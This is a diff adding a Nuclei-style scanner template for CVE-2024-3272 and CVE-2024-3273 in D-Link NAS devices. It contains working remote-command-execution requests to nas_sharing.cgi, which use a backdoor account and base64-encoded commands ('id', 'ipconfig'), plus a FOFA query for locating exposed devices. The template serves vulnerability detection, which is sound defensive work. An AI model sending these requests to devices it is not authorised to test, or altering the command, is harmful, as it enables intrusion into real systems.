@@ -1,0 +1,35 @@
+id: d-link-nas-nas_sharing-rce
+info:
+  name: d-link nas nas_sharing.cgi - rce
+  author: leadlife
+  severity: critical
+  description: 
+  reference: 
+    - https://github.com/wy876/POC/blob/9eefec0a4c311a412a86ab83bef3a25d3cb1766d/D-Link/D-Link-NAS(CVE-2024-3272%26%26CVE-2024-3273).md
+  classification:
+    cve-id: CVE-2024-3272 and CVE-2024-3273
+  metadata:
+    verified: true
+    fofa-query: body="Text:In order to access the ShareCenter"
+    hunter-query: demo
+    tips:
+    repair:
+    version:
+  tags: d-link,nas,rce,dlink
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/cgi-bin/nas_sharing.cgi?user=messagebus&passwd==&cmd=15&system=aWQ="
+      - "{{BaseURL}}/cgi-bin/nas_sharing.cgi?user=messagebus&passwd==&cmd=15&system=aXBjb25maWc="
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)"
+
+      - type: status
+        status:
+          - 200
